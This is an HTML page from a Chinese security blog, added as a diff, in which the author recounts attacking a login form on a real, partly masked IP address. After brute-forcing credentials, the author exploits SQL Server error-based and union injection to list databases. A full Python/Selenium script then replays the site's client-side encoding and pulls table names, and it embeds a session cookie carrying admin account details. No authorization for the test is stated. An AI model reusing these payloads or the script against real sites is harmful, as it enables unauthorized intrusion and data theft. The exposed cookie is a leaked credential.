@@ -1,0 +1,792 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>记一次SQL Server报错注入 - Reber's Blog</title>
+    <meta name="keywords" content="渗透测试,web安全,漏洞,python,php,linux">
+    <meta name="description" content="我的个人博客，主要用于记录自己的一些学习笔记之类的东西，其中有渗透测试、python、php等。">
+    <meta name="author" content="reber">
+
+    
+    
+    <link rel="stylesheet" type="text/css" href="/css/pure-min.css">
+
+    <!--[if lte IE 8]>
+    <link rel="stylesheet" type="text/css" href="/css/grids-responsive-old-ie-min.css">
+    <![endif]-->
+    <!--[if gt IE 8]><!-->
+    <link rel="stylesheet" type="text/css" href="/css/grids-responsive-min.css">
+    <!--<![endif]-->
+
+    <link rel="stylesheet" type="text/css" href="/css/style.css">
+
+    
+    <link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+    
+    <link rel="shortcut icon" type="image/x-icon" href="/img/favicon.ico" />
+
+    
+    <link rel="stylesheet" type="text/css" href="/css/fonts-googleapis.css">
+
+    
+    <link rel="alternate" type="application/rss+xml" title="Reber&#39;s Blog" href="/index.xml" />
+
+    
+    <link rel="stylesheet" href="/css/monokai-sublime.css" type="text/css">
+    <script src="/js/highlight.min.js"></script>
+    <script>hljs.initHighlightingOnLoad();</script>
+
+    <script src="/js/jquery.min.js"></script>
+
+</head>
+<body>
+
+
+
+
+<div class="reber">
+    
+<div class="head">
+    <h1 class="logo" id="logo">
+        <a href="/"><img src='/img/logo.png' width='70px'></a>
+    </h1>
+    <ul class="nav">
+        
+            
+                <li>
+                    <a href="/"><i class='fa fa-home fa-fw'></i>Home</a>
+            
+                </li>
+        
+            
+                <li>
+                    <a href="/posts/"><i class='fa fa-list fa-fw'></i>Archive</a>
+            
+                </li>
+        
+            
+                <li>
+                    <a href="/about/"><i class='fa fa-user fa-fw'></i>About</a>
+            
+                </li>
+        
+    </ul>
+</div>
+
+
+    <div class="main">
+        <div class="left">
+            <div>
+                <h2>记一次SQL Server报错注入</h2>
+                
+                <div class="post-meta">
+                    <div style="padding:5px 5px 2px 5px;">
+                        <i class="fa fa-calendar fa-fw"></i>
+                        <time>
+                            
+                                2018-12-24
+                            
+                        </time>
+                        &nbsp;&nbsp;&nbsp;&nbsp;
+                    
+
+                    
+
+                    
+                        
+                        
+                        
+                            <i class="fa fa-folder fa-fw"></i>
+                            
+                                <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
+                            
+                        
+                        
+                        &nbsp;&nbsp;&nbsp;&nbsp;
+                        
+                        
+                        
+                            <i class="fa fa-tags fa-fw"></i>
+                            
+                                <a class="post-taxonomy-tag" href="http://wyb0.com/tags/injection">injection</a>
+                            
+                        
+                        
+                    </div>
+                </div>
+                
+            </div>
+            <div class="content">
+                
+                
+
+<h3 id="0x00-验证码前端验证">0x00 验证码前端验证</h3>
+
+<p>需要测试一个网站，刚开始看到网站时感觉希望不大，因为验证码是需要拖动的，这也就意味着很大可能没办法爆破，另一方面是都用这种验证码了，安全做的能很差劲吗？果然，试了admin、123456之类的都不行
+<img src="/img/post/20181224-200518.png" alt="40" /></p>
+
+<p>那就抓个包吧
+<img src="/img/post/20181224-200528.png" alt="70" /></p>
+
+<p>emmmmmm。 32位，md5加密？这里看着没有验证码之类的信息，把这个包发了几次发现没有出现验证码信息，而且试了试，发现有两种状态(运气比较好，有admin这个用户，我也是试的这个用户，一下子就看出返回不同了)，如下：</p>
+
+<p>用户不存在时返回
+<code>{&quot;iserror&quot;:true,&quot;message&quot;:&quot;用户名不存在！&quot;,&quot;data&quot;:null,&quot;errorfieldlist&quot;:null}</code></p>
+
+<p>用户名存在时返回
+<code>{&quot;iserror&quot;:true,&quot;message&quot;:&quot;密码不正确！&quot;,&quot;data&quot;:null,&quot;errorfieldlist&quot;:null}</code></p>
+
+<p>可以的，验证码前端验证，我觉得可以burp抓包intruder一下</p>
+
+<p>跑了top 500的用户名和top 1000的密码，除了直接试的用户名admin，其他的一个都没有跑出来 sad</p>
+
+<h3 id="0x01-存在注入">0x01 存在注入</h3>
+
+<p>嗯看来爆破是基本没有希望了，测其他的吧，嗯，这里是登陆，那肯定要看注入的，无脑加单引号，boom！
+<img src="/img/post/20181224-201033.png" alt="80" />
+<img src="/img/post/20181224-201133.png" alt="80" />
+<img src="/img/post/20181224-201233.png" alt="80" /></p>
+
+<p>可以的，and 1=1 有注入</p>
+
+<p>哎？？！！！那不对啊，咋的后台还解密md5后进行查询？？</p>
+
+<p>刚才看了数据包，用户名密码都是32位，猜想sql语句是：<code>select password from user where username=name_md5_hash</code>，然后判断用户存不存在之类的</p>
+
+<p>看返回信息的话显然不是啊，哪有后台解密md5后查询的。。。。。。</p>
+
+<p>试试post其他用户名和密码，然后看数据包
+<img src="/img/post/20181224-201534.png" alt="80" /></p>
+
+<p>显然并不是md5。。。。  这个是前端加密后发送的。。。。。看一下js，结果发现了这个
+<img src="/img/post/20181224-201945.png" alt="80" />
+<img src="/img/post/20181224-202035.png" alt="80" /></p>
+
+<p>emmmmm，想了想，应该可以注入的，看看啥系统
+<img src="/img/post/20181224-202205.png" alt="50" /></p>
+
+<p>大概率SQL Server了(因为前几天在t00ls刚看到了一个ASP.NET+MySQL，比较任性)，所以这里看一下，发现确实是SQL Server
+<img src="/img/post/20181224-202314.png" alt="80" /></p>
+
+<p>看看数据库版本，嗯，看来还是报错注入
+<img src="/img/post/20181224-202358.png" alt="80" /></p>
+
+<p>可以可以，看看有几列，然后进行union注入
+<img src="/img/post/20181224-202513.png" alt="80" />
+<img src="/img/post/20181224-202556.png" alt="80" /></p>
+
+<p>一列，这里也能大致猜出来sql语句了，估计就是：<code>select password from user where username='admin'</code></p>
+
+<p>那就看看数据库吧，不知道SQL Server中的concat怎么用，一个个来吧。。。。</p>
+
+<p>得到第一个数据库的名字：<code>union select name from master.dbo.sysdatabases where dbid=1</code>
+<img src="/img/post/20181224-202716.png" alt="80" /></p>
+
+<p>得到第二个数据库的名字：<code>union select name from master.dbo.sysdatabases where dbid=2</code>
+<img src="/img/post/20181224-202751.png" alt="80" /></p>
+
+<p>得到第5个数据库的名字：<code>union select name from master.dbo.sysdatabases where dbid=5</code>
+<img src="/img/post/20181224-202830.png" alt="80" /></p>
+
+<p>好麻烦啊，拖一下验证码，然后得到一个数据库，而且后面还有表呢。。。。。</p>
+
+<p>py一下了吧，前端有js进行加密，可以本地写文件生成加密后的payload，然后python拿到payload后进行注入</p>
+
+<h3 id="0x02-尝试写php得到加密后的payload">0x02 尝试写php得到加密后的payload</h3>
+
+<p>把加密的那个js文件SkyEnCode.js保存到本地，然后写php文件，php的话接收一个未加密的payload然后返回一个加密后的payload，大致代码：</p>
+
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;head&gt;
+    &lt;script src=jquery.min.js&gt;&lt;/script&gt;
+    &lt;script src=SkyEnCode.js&gt;&lt;/script&gt;
+    &lt;title&gt;test&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;?php
+        $name = $_GET['name'];
+        echo &quot;&lt;script&gt;
+                var name = '&quot;.$name.&quot;';
+                document.write('&gt;&gt;&gt;'+SkyEnCode.EscKeyCode(name) +'&lt;&lt;&lt;');
+            &lt;/script&gt;&quot;;
+    ?&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>看了下，返回的结果是一样的，可以用(实际上并不能。。。)
+<img src="/img/post/20181224-203312.png" alt="75" /></p>
+
+<h3 id="0x03-通过python获取js加密后的payload">0x03 通过python获取js加密后的payload</h3>
+
+<p>本来是写python获取加密后的payload来着</p>
+
+<pre><code>def encode_payload(payload):
+    html = requests.get(&quot;http://127.0.0.1/tmp.php?name={}&quot;.format(payload)).text
+    m = re.findall(r'&gt;&gt;&gt;(.*?)&lt;&lt;&lt;', html)
+    return m
+</code></pre>
+
+<p>但是获取到的是：<code>[u&quot;'+SkyEnCode.EscKeyCode(name)+'&quot;]</code>，因为js没有执行加载，所以得到的是js未执行时的页面源码</p>
+
+<p>记得以前看过一个东西，selenium，可以调用浏览器驱动模拟浏览器点击啥的，记得可以执行js，想到就做</p>
+
+<p>首先安装selenium：<code>sudo pip install selenium --user -U</code></p>
+
+<p>然后在<a href="http://chromedriver.storage.googleapis.com/index.html?_blank">http://chromedriver.storage.googleapis.com/index.html</a>下载Chrome的驱动，然后放到/opt下</p>
+
+<pre><code>[21:07 reber@wyb in ~]
+➜  ls /opt/chromedriver
+/opt/chromedriver
+[21:07 reber@wyb in ~]
+➜  /opt/chromedriver --version
+ChromeDriver 70.0.3538.97 (d035916fe243477005bc95fe2a5778b8f20b6ae1)
+</code></pre>
+
+<p>获取加密后payload的代码重写如下(此时已经不需要页面接收参数了，页面能引入js我们调用执行就行)：
+<img src="/img/post/20181224-204122.png" alt="80" /></p>
+
+<p>python运行后得到的userName和网页上的一样
+<img src="/img/post/20181224-204417.png" alt="70" />
+<img src="/img/post/20181224-204444.png" alt="80" /></p>
+
+<h3 id="0x04-得到数据库的表名">0x04 得到数据库的表名</h3>
+
+<p>数据库名的话可以通过union注入改变dbid即可得到，比较简单，表名的话这里写代码获取第5个数据库gansu的表名
+<img src="/img/post/20181224-204559.png" alt="" /></p>
+
+<p>不再继续深入</p>
+
+<h3 id="0x05-详细代码">0x05 详细代码</h3>
+
+<pre><code>#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# code by reber &lt;1070018473@qq.com&gt;
+
+import re
+import time
+import requests
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
+
+url = &quot;http://117.156.***.***/newcc/Common/AccessToken.do&quot;
+headers = {
+    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0&quot;,
+    &quot;Accept&quot;: &quot;application/json, text/javascript, */*; q=0.01&quot;,
+    &quot;Cookie&quot;: &quot;currentuser_JSON=eyJpZCI6MSwiZGVsc3RhdHVzIjowLCJkZXB0aWQiOjEsInVuaXRpZCI6MSwiY2hpbmFuYW1lIjoi566h55CG5ZGYIiwibG9naW5uYW1lIjoiYWRtaW4iLCJiaXJ0aCI6bnVsbCwic2V4IjoxLCJwYXNzd29yZCI6ImthdkRhVzRoanMzK3dIeC90czhvdSsxVEYzQT0iLCJtYWlsIjoiYWRtaW5Ac2t5dGVjaC5jb20iLCJpZGNhcmQiOm51bGwsIm1vYmlsZSI6bnVsbCwicGhvbmVkZXB0IjoiMDI1ODg4ODg4ODgiLCJwaG9uZWhvbWUiOiIwMjU4ODg4ODg4OCIsInBlcm1zdHJpbmciOiI3MSw2Niw4OSw0NywxMDcsMTMxLDU4LDc4LDI0NSw5Miw0MSw1NCw1NiwxLDcsMjcsMjgsNjksMzkiLCJwZXJzb25yb2xlcyI6IjgiLCJzb3J0aW5kZXgiOjAsImlzaGFzY2FyZHR5cGUiOjAsImFkZGVyIjoxLCJhZGR0aW1lIjoiMjAwNi8wMi8yMCAxMzoyOToyNiIsIm1vZGVyIjoxLCJtb2R0aW1lIjoiMjAxNy8wOC8xOSAwOToxMDo0MCJ9&quot;,
+}
+
+def encode_payload(payload):
+    chrome_options = Options()
+    chrome_options.add_argument('--headless') #无头模式，不打开浏览器界面
+    chrome = webdriver.Chrome(executable_path=r&quot;/opt/chromedriver&quot;,chrome_options=chrome_options)
+
+    try:
+        chrome.get(&quot;http://127.0.0.1/tmp.php&quot;)
+        # chrome.maximize_window() #不设置无头模式时最大化窗口
+        # time.sleep(20) #等待请求完页面
+        # print chrome.page_source #输出页面的html
+        js = &quot;var en_payload = SkyEnCode.EscKeyCode(\&quot;{}\&quot;);return en_payload;&quot;.format(payload)
+        en_payload = chrome.execute_script(js) #调用页面中加载的js代码中的加密函数
+        return en_payload
+    except Exception as e:
+        print str(e)
+    finally:
+        chrome.close()
+
+def get_tables(database):
+    payload1 = &quot;admin' and (select top 1 '~~'+name+'~~' from {}.dbo.sysobjects where xtype='U')&gt;1--&quot;.format(database)
+    payload2 = &quot;admin' and (select top 1 '~~'+name+'~~' from {}.dbo.sysobjects where xtype='U' and name not in ({}))&gt;1 --&quot;
+
+    #先得到第一张表名
+    en_payload = encode_payload(payload1)
+    data = {&quot;userName&quot;: en_payload,&quot;userPwd&quot;: &quot;823d9ed14f2b86bb15234e4893c3ec54&quot;}
+    html = requests.post(url=url,data=data,headers=headers).content
+    c_table = re.search(r'~~(.*?)~~', html).group(1)
+
+    #通过for循环得到其他的表名
+    tables = list()
+    for x in xrange(5):
+        tables.append(&quot;'&quot;+c_table+&quot;'&quot;)
+        fm = &quot;,&quot;.join(str(table) for table in tables)
+        _payload = payload2.format(database,fm)
+        print _payload
+        data = {&quot;userName&quot;: encode_payload(_payload),&quot;userPwd&quot;: &quot;9ad64932f8832810867a5b9e956206ca&quot;}
+        html = requests.post(url=url,data=data,headers=headers).content
+        print html
+        c_table = re.search(r'~~(.*?)~~', html).group(1)
+    print tables
+
+get_tables('gansu')
+</code></pre>
+
+                
+                <div style="padding:10px 1px;">
+                    <font color="FF0000">若未作声明则文章版权归本人所有，转载请注明原文链接：</font>
+                    <script>
+                        var link = decodeURI(window.location.href);
+                        var url = '<a href="' + link + '">'+link+'</a>';
+                        document.write(url);
+                    </script>
+                </div>
+
+                
+<div class="prev-next-post pure-g">
+    <div class="pure-u-12-24" style="text-align: left;">
+        
+        <nav class="prev">
+            <a href="http://wyb0.com/posts/2018/docker-compose-build-lamp/">
+                <i class="fa fa-chevron-left"></i>&nbsp;&nbsp;&nbsp;使用docker-compose构造LAMP环境
+            </a>
+        </nav>
+        
+    </div>
+    <div class="pure-u-12-24" style="text-align: right;">
+        
+        <nav class="next">
+            <a href="http://wyb0.com/posts/2018/oracle-database/">
+                Oracle数据库简单使用&nbsp;&nbsp;&nbsp;<i class="fa fa-chevron-right"></i>
+            </a>
+        </nav>
+        
+    </div>
+</div>
+
+            </div>
+        </div>
+        <div class="right">
+            
+
+<div style="padding-bottom:10px;">
+
+
+    <h2 class="asidetitle">Categorie<a href="/single.html" class="single">s</a></h2>
+    <ul style="margin-left:10px;margin-bottom:0px;left:10px;">
+        
+            <li style="list-style-type:none;">
+                <i class="fa fa-folder fa-fw"></i>
+                <a href="http://wyb0.com/topics/database" title="database">database(11)</a>
+            </li>
+        
+            <li style="list-style-type:none;">
+                <i class="fa fa-folder fa-fw"></i>
+                <a href="http://wyb0.com/topics/git" title="git">git(6)</a>
+            </li>
+        
+            <li style="list-style-type:none;">
+                <i class="fa fa-folder fa-fw"></i>
+                <a href="http://wyb0.com/topics/javascript" title="javascript">javascript(4)</a>
+            </li>
+        
+            <li style="list-style-type:none;">
+                <i class="fa fa-folder fa-fw"></i>
+                <a href="http://wyb0.com/topics/linux" title="linux">linux(26)</a>
+            </li>
+        
+            <li style="list-style-type:none;">
+                <i class="fa fa-folder fa-fw"></i>
+                <a href="http://wyb0.com/topics/other" title="other">other(16)</a>
+            </li>
+        
+            <li style="list-style-type:none;">
+                <i class="fa fa-folder fa-fw"></i>
+                <a href="http://wyb0.com/topics/pentest" title="pentest">pentest(76)</a>
+            </li>
+        
+            <li style="list-style-type:none;">
+                <i class="fa fa-folder fa-fw"></i>
+                <a href="http://wyb0.com/topics/php" title="php">php(12)</a>
+            </li>
+        
+            <li style="list-style-type:none;">
+                <i class="fa fa-folder fa-fw"></i>
+                <a href="http://wyb0.com/topics/python" title="python">python(35)</a>
+            </li>
+        
+            <li style="list-style-type:none;">
+                <i class="fa fa-folder fa-fw"></i>
+                <a href="http://wyb0.com/topics/server" title="server">server(10)</a>
+            </li>
+        
+            <li style="list-style-type:none;">
+                <i class="fa fa-folder fa-fw"></i>
+                <a href="http://wyb0.com/topics/windows" title="windows">windows(4)</a>
+            </li>
+        
+    </ul>
+
+
+</div>
+            
+
+<div style="padding-bottom:10px;">
+
+
+    <h2 class="asidetitle">Tags</h2>
+    <div class="taglist" id="tags">
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/ajax" title="ajax">ajax</a>
+                <sup>3</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/cgi" title="cgi">cgi</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/csrf" title="csrf">csrf</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/c%e8%af%ad%e8%a8%80" title="c语言">c语言</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/dedecms" title="dedecms">dedecms</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/des" title="des">des</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/dmz" title="dmz">dmz</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/docker" title="docker">docker</a>
+                <sup>6</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/getshell" title="getshell">getshell</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/git" title="git">git</a>
+                <sup>6</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/https" title="https">https</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/injection" title="injection">injection</a>
+                <sup>16</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/intranet" title="intranet">intranet</a>
+                <sup>10</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/javascript" title="javascript">javascript</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/linux" title="linux">linux</a>
+                <sup>11</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/markdown" title="markdown">markdown</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/miscellanea" title="miscellanea">miscellanea</a>
+                <sup>3</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/module" title="module">module</a>
+                <sup>14</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/mongodb" title="mongodb">mongodb</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/mysql" title="mysql">mysql</a>
+                <sup>6</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/oracle" title="oracle">oracle</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/pentest" title="pentest">pentest</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/php" title="php">php</a>
+                <sup>12</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/plan" title="plan">plan</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/poc" title="poc">poc</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/python" title="python">python</a>
+                <sup>33</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/redis" title="redis">redis</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/server" title="server">server</a>
+                <sup>11</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/software" title="software">software</a>
+                <sup>8</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/sqlserver" title="sqlserver">sqlserver</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/ssh%e9%9a%a7%e9%81%93" title="ssh隧道">ssh隧道</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/ssrf" title="ssrf">ssrf</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/thread" title="thread">thread</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/tools" title="tools">tools</a>
+                <sup>10</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/tornado" title="tornado">tornado</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/wireless" title="wireless">wireless</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/xml" title="xml">xml</a>
+                <sup>3</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/xss" title="xss">xss</a>
+                <sup>4</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c" title="代码执行">代码执行</a>
+                <sup>5</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e4%bf%a1%e6%81%af%e6%b3%84%e9%9c%b2" title="信息泄露">信息泄露</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" title="反序列化">反序列化</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e5%8f%8d%e5%bc%b9shell" title="反弹shell">反弹shell</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e5%90%8e%e9%97%a8" title="后门">后门</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c" title="命令执行">命令执行</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f" title="操作系统">操作系统</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e6%95%8f%e6%84%9f%e4%bf%a1%e6%81%af%e6%b3%84%e9%9c%b2" title="敏感信息泄露">敏感信息泄露</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0" title="文件上传">文件上传</a>
+                <sup>3</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab" title="文件包含">文件包含</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e6%ad%a3%e5%88%99" title="正则">正则</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e7%88%86%e7%a0%b4" title="爆破">爆破</a>
+                <sup>5</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e7%ab%af%e5%8f%a3%e8%bd%ac%e5%8f%91" title="端口转发">端口转发</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e7%bd%91%e7%bb%9c%e8%ae%be%e5%a4%87" title="网络设备">网络设备</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e8%84%91%e5%9b%be" title="脑图">脑图</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e8%99%9a%e6%8b%9f%e6%9c%ba" title="虚拟机">虚拟机</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e9%80%bb%e8%be%91%e6%bc%8f%e6%b4%9e" title="逻辑漏洞">逻辑漏洞</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e9%87%8d%e5%ae%9a%e5%90%91" title="重定向">重定向</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e9%92%93%e9%b1%bc" title="钓鱼">钓鱼</a>
+                <sup>1</sup>
+            </p>
+        
+    </div>
+
+
+</div>
+
+            
+<div style="padding-bottom:10px;">
+    <h2 class="asidetitle">Links</h2>
+    <ul style="margin-left:10px;margin-bottom:0px;left:10px;">
+        <li style="list-style-type:none;">
+            <i class="fa fa-link fa-fw"></i><a href="http://www.test404.com/" target="_blank">Test404's Blog</a>
+        </li>
+        <li style="list-style-type:none;">
+            <i class="fa fa-link fa-fw"></i><a href="http://zksmile.me/" target="_blank">Zksmile's Blog</a>
+        </li>
+        <li style="list-style-type:none;">
+            <i class="fa fa-link fa-fw"></i><a href="https://y-hkl.github.io/" target="_blank">Y-HKL's Blog</a>
+        </li>
+        <li style="list-style-type:none;">
+            <i class="fa fa-link fa-fw"></i><a href="https://s.yl0.org/" target="_blank">sòng•sec</a>
+        </li>
+    </ul>
+</div>
+
+            
+<div style="padding-bottom:10px;">
+    <h2 class="asidetitle">Social</h2>
+    <ul style="margin-left:10px;margin-bottom:0px;left:10px;">
+        <li style="list-style-type:none;">
+            
+                <i class="fa fa-github-square fa-fw"></i><a href="https://github.com/reber0" target="_blank">GitHub</a>
+            
+        </li>
+        <li style="list-style-type:none;">
+            
+                <i class="fa fa-weibo fa-fw"></i><a href="http://weibo.com/u/5819760166" target="_blank">Weibo</a>
+            
+        </li>
+        <li style="list-style-type:none;">
+            <i class="fa fa-rss fa-fw"></i><a href="http://wyb0.com/index.xml" target="_blank">RSS</a>
+        </li>
+    </ul>
+</div>
+        </div>
+    </div>
+
+    <br>
+    
+<div class="foot">
+    <div class="copyright">
+        
+        Copyright &copy; 2015-<script>var d=new Date();document.write(d.getFullYear());</script> Reber. All Rights Reserved.
+
+        
+        <script type="text/javascript" src="//js.users.51.la/19363536.js"></script>
+        <a href="https://www.51.la/?19363536" target="_blank" title="51.La 网站流量统计系统">网站统计</a>
+        
+        <script type="text/javascript" src="//quote.51.la/q?id=19363536&mb=1"></script>
+    </div>
+    <script>$('.copyright img').remove();</script>
+</div>
+</div>
+
+    
+    <div class="goToTop">
+      <a href="#top" id="goToTop">
+        <img src="http://wyb0.com/img/goto_top.png" alt="可以返回顶部" title="回到顶部"/>
+      </a>
+    </div>
+
+    <script src="/js/style.js"></script>
+
+    
+    
+
+</body>
+</html>
+
+
